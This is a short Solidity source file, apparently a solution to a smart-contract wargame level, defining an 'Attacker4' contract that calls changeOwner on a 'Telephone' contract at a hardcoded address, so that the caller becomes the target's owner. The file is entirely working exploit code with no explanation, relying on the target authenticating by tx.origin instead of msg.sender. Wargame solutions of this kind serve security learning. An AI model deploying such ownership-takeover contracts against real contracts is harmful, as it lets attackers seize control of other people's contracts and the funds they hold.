// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/access/Ownable.sol";

abstract contract Telephone {
    function changeOwner(address _owner) public virtual;
}

contract Attacker4 is Ownable {
    Telephone targetContract =
        Telephone(0xd2A0bE0fd1543C051Cee56c4101f807c05b170eB);

    function attack() external onlyOwner {
        targetContract.changeOwner(msg.sender);
    }
}
